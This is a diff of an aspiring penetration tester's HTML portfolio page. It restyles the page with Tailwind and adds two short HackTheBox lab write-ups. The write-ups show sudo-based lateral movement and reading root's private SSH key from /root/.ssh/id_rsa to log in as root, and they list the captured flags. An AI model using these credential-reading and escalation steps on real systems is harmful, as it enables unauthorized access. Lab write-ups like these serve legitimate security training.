@@ -4,79 +4,22 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Ednell June Songahid | Cybersecurity Portfolio</title>
-    <style>
-      body {
-        font-family: Arial, sans-serif;
-        margin: 0;
-        padding: 0;
-        line-height: 1.6;
-        background: #ffffff;
-        color: #222222;
-      }
-      header {
-        background: #f4f4f4;
-        padding: 20px;
-        text-align: center;
-      }
-      header h1 {
-        margin: 0;
-        color: #000000;
-      }
-      section {
-        max-width: 900px;
-        margin: 30px auto;
-        padding: 0 20px;
-      }
-      h2 {
-        color: #000000;
-        border-bottom: 1px solid #007777;
-        padding-bottom: 5px;
-      }
-      table {
-        width: 100%;
-        border-collapse: collapse;
-        margin-top: 10px;
-      }
-      table,
-      th,
-      td {
-        border: 1px solid #ccc;
-      }
-      th,
-      td {
-        padding: 10px;
-        text-align: left;
-      }
-      a {
-        color: #0077cc;
-      }
-      footer {
-        text-align: center;
-        padding: 20px;
-        background: #f4f4f4;
-        color: #666;
-      }
-      em {
-        display: block;
-        margin-top: 10px;
-        color: #555;
-      }
-    </style>
+    <script src="https://cdn.tailwindcss.com"></script>
   </head>
-  <body>
-    <header>
+  <body class="bg-white text-gray-900 font-sans">
+    <header class="bg-gray-100 py-6 text-center">
       <img
         src="profile.jpg"
         alt="Profile photo of Ednell June Songahid"
-        style="width: 150px; border-radius: 50%; margin-top: 10px"
+        class="w-36 h-36 rounded-full mx-auto mb-4"
       />
-      <h1>Ednell June Songahid</h1>
-      <p>Aspiring Penetration Tester</p>
+      <h1 class="text-3xl font-bold">Ednell June Songahid</h1>
+      <p class="text-lg text-gray-600">Aspiring Penetration Tester</p>
     </header>
 
-    <section>
-      <h2>About Me</h2>
-      <p>
+    <section class="max-w-4xl mx-auto px-4 py-8">
+      <h2 class="text-2xl font-bold border-b border-teal-500 pb-2">About Me</h2>
+      <p class="mt-4">
         Aspiring penetration tester with a passion for ethical hacking and
         cybersecurity. Currently progressing through
         <strong>Hack The Box (HTB) Academy</strong>, with plans to complete
@@ -84,23 +27,28 @@
         journey through write-ups, labs and personal projects to showcase
         practical skills and continuous learning.
       </p>
-      <em
-        >"I believe in learning by doing, and I'm building my skills every day
-        by breaking things in the lab - so I can protect them in the real
-        world."</em
-      >
+      <em class="block mt-4 text-gray-600">
+        "I believe in learning by doing, and I'm building my skills every day by
+        breaking things in the lab - so I can protect them in the real world."
+      </em>
     </section>
 
-    <section>
-      <h2>Contact Information</h2>
-      <ul>
+    <section class="max-w-4xl mx-auto px-4 py-8">
+      <h2 class="text-2xl font-bold border-b border-teal-500 pb-2">
+        Contact Information
+      </h2>
+      <ul class="list-disc list-inside mt-4">
         <li>
-          Email: <a href="mailto:edsongahid@gmail.com">edsongahid@gmail.com</a>
+          Email:
+          <a href="mailto:edsongahid@gmail.com" class="text-blue-600 underline"
+            >edsongahid@gmail.com</a
+          >
         </li>
         <li>
           LinkedIn:
           <a
             href="https://www.linkedin.com/in/ednell-june-songahid-17436b141/"
+            class="text-blue-600 underline"
             target="_blank"
             >ednell-june-songahid</a
           >
@@ -108,194 +56,145 @@
       </ul>
     </section>
 
-    <section>
-      <h2>Certificate & Training</h2>
-      <table>
-        <thead>
+    <section class="max-w-6xl mx-auto px-4 py-8 overflow-x-auto">
+      <h2 class="text-2xl font-bold border-b border-teal-500 pb-2">
+        Certificate & Training
+      </h2>
+      <table
+        class="table-auto w-full text-sm mt-4 border border-collapse border-gray-300"
+      >
+        <thead class="bg-gray-100">
           <tr>
-            <th>Certification & Training</th>
-            <th>Status</th>
-            <th>Completion Date</th>
+            <th class="border px-4 py-2 text-left">Certification & Training</th>
+            <th class="border px-4 py-2 text-left">Status</th>
+            <th class="border px-4 py-2 text-left">Completion Date</th>
           </tr>
         </thead>
-        <tbody>
-          <tr>
-            <td>HTB Academy: Penetration Testing Process</td>
-            <td>Completed</td>
-            <td>March 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Penetration Getting Started</td>
-            <td>In Progress</td>
-            <td>April 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Network Enumeration with Nmap</td>
-            <td>Planned</td>
-            <td>April 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Footprinting</td>
-            <td>Planned</td>
-            <td>April 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Information Gathering - Web Edition</td>
-            <td>Planned</td>
-            <td>April 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Vulnerability Assessment</td>
-            <td>Planned</td>
-            <td>April 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: File Transfers</td>
-            <td>Planned</td>
-            <td>April 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Penetration Shells & Payloads</td>
-            <td>Planned</td>
-            <td>April 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Using the Metasploit Framework</td>
-            <td>Planned</td>
-            <td>April 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Password Attacks</td>
-            <td>Planned</td>
-            <td>April 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Attacking Common Services</td>
-            <td>Planned</td>
-            <td>April 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Pivoting, Tunneling, and Port Forwarding</td>
-            <td>Planned</td>
-            <td>May 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Active Directory Enumeration & Attacks</td>
-            <td>Planned</td>
-            <td>May 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Using Web Proxies</td>
-            <td>Planned</td>
-            <td>May 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Attacking Web Applications with Ffuf</td>
-            <td>Planned</td>
-            <td>May 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Login Brute Forcing</td>
-            <td>Planned</td>
-            <td>May 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: SQL Injection Fundamentals</td>
-            <td>Planned</td>
-            <td>May 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: SQLMap Essentials</td>
-            <td>Planned</td>
-            <td>May 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Cross-Site Scripting (XSS)</td>
-            <td>Planned</td>
-            <td>May 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: File Inclusion</td>
-            <td>Planned</td>
-            <td>May 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: File Upload Attacks</td>
-            <td>Planned</td>
-            <td>May 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Command Injections</td>
-            <td>Planned</td>
-            <td>June 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Web Attacks</td>
-            <td>Planned</td>
-            <td>June 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Attacking Common Applications</td>
-            <td>Planned</td>
-            <td>June 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Linux Privilege Escalation</td>
-            <td>Planned</td>
-            <td>June 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Windows Privilege Escalation</td>
-            <td>Planned</td>
-            <td>June 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Documentation & Reporting</td>
-            <td>Planned</td>
-            <td>June 2025</td>
-          </tr>
-          <tr>
-            <td>HTB Academy: Attacking Enterprise Networks</td>
-            <td>Planned</td>
-            <td>June 2025</td>
-          </tr>
-          <tr>
-            <td>PenTest+ (Plus) Certification</td>
-            <td>Planned</td>
-            <td>June 2025</td>
-          </tr>
-        </tbody>
+        <tbody></tbody>
       </table>
     </section>
 
-    <section>
-      <h2>Technical Skills</h2>
-      <ul>
+    <section class="max-w-4xl mx-auto px-4 py-8">
+      <h2 class="text-2xl font-bold border-b border-teal-500 pb-2">
+        Technical Skills
+      </h2>
+      <ul class="list-disc list-inside mt-4">
         <li>Pentesting Tools: Nmap, Metasploit, Wireshark</li>
       </ul>
     </section>
 
-    <section>
-      <h2>Projects & Practical Labs</h2>
-      <ol>
-        <li>HackTheBox Machines</li>
-        <li>Capture The Flag (CTF) Challenges</li>
-        <li>Scripts & Tools</li>
-      </ol>
+    <!-- HTB Writeups Section -->
+    <section class="bg-gray-50 py-10">
+      <div class="max-w-4xl mx-auto px-4">
+        <h2 class="text-2xl font-bold border-b border-teal-500 pb-2 mb-6">
+          HackTheBox Writeups
+        </h2>
+        <div class="space-y-4">
+          <!-- Writeup 1 -->
+          <div class="border border-gray-200 rounded shadow-sm">
+            <button
+              onclick="toggleVisibility('writeup1')"
+              class="w-full text-left px-4 py-3 bg-white hover:bg-gray-100 font-semibold"
+            >
+              Lateral Movement – User Escalation (7 May 2025)
+            </button>
+            <div
+              id="writeup1"
+              class="hidden px-4 py-3 bg-white text-sm text-gray-700"
+            >
+              <p>
+                <strong>Objective:</strong> SSH as user1, escalate to user2,
+                capture the flag at <code>/home/user2/flag.txt</code>.
+              </p>
+              <pre class="bg-gray-100 p-2 mt-2 text-xs overflow-auto">
+ssh user1@94.237.58.222 -p 49562</pre
+              >
+              <pre class="bg-gray-100 p-2 mt-2 text-xs overflow-auto">
+sudo -l\nsudo -u user2 /bin/bash\ncd /home/user2\ncat flag.txt</pre
+              >
+              <p class="mt-2 text-teal-700 font-mono">
+                Flag: HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
+              </p>
+            </div>
+          </div>
+          <!-- Writeup 2 -->
+          <div class="border border-gray-200 rounded shadow-sm">
+            <button
+              onclick="toggleVisibility('writeup2')"
+              class="w-full text-left px-4 py-3 bg-white hover:bg-gray-100 font-semibold"
+            >
+              Privilege Escalation – Root Access (8 May 2025)
+            </button>
+            <div
+              id="writeup2"
+              class="hidden px-4 py-3 bg-white text-sm text-gray-700"
+            >
+              <p>
+                <strong>Objective:</strong> Escalate from user2 to root using
+                SSH key and capture flag in <code>/root/flag.txt</code>.
+              </p>
+              <pre class="bg-gray-100 p-2 mt-2 text-xs overflow-auto">
+cat /root/.ssh/id_rsa\nnano id_rsa\nchmod 600 id_rsa\nssh root@94.237.58.222 -p 49562 -i id_rsa\ncat /root/flag.txt</pre
+              >
+              <p class="mt-2 text-teal-700 font-mono">
+                Flag: HTB{pr1v1l363_35c4l4710n_2_r007}
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
     </section>
 
-    <section>
-      <h2>Sample Reports</h2>
-      <p>Coming soon...</p>
+    <!-- Sample Reports -->
+    <section class="max-w-4xl mx-auto px-4 py-8">
+      <h2 class="text-2xl font-bold border-b border-teal-500 pb-2">
+        Sample Reports
+      </h2>
+      <!-- <ul class="list-disc list-inside mt-4 space-y-2">
+        <li>
+          Web Application Penetration Test Report –
+          <a
+            href="https://drive.google.com/your-sample-report-link"
+            target="_blank"
+            class="text-blue-600 underline"
+            >View PDF</a
+          >
+        </li>
+        <li>
+          Network Vulnerability Assessment –
+          <a
+            href="https://drive.google.com/your-second-report-link"
+            target="_blank"
+            class="text-blue-600 underline"
+            >View PDF</a
+          >
+        </li>
+      </ul> -->
+      <p class="mt-4 text-gray-700">
+        Coming soon. This section will share documented report from CTFs,
+        writeups, and lab exercises.
+      </p>
     </section>
 
-    <section>
-      <h2>Blog / Lessons Learned</h2>
-      <p>Coming soon...</p>
+    <!-- Blog Section -->
+    <section class="max-w-4xl mx-auto px-4 py-8">
+      <h2 class="text-2xl font-bold border-b border-teal-500 pb-2">
+        Blog / Lessons Learned
+      </h2>
+      <p class="mt-4 text-gray-700">
+        Coming soon. This section will share key takeaways and learning
+        experiences from CTFs, writeups, and lab exercises.
+      </p>
     </section>
 
-    <footer>
-      <p>&copy; 2025 Ednell June Songahid | Built with HTML & CSS</p>
+    <footer class="bg-gray-100 text-center py-6 text-sm text-gray-600">
+      &copy; 2025 Ednell June Songahid | Built with HTML & Tailwind CSS
     </footer>
+
+    <script>
+      function toggleVisibility(id) {
+        document.getElementById(id).classList.toggle("hidden");
+      }
+    </script>
   </body>
 </html>
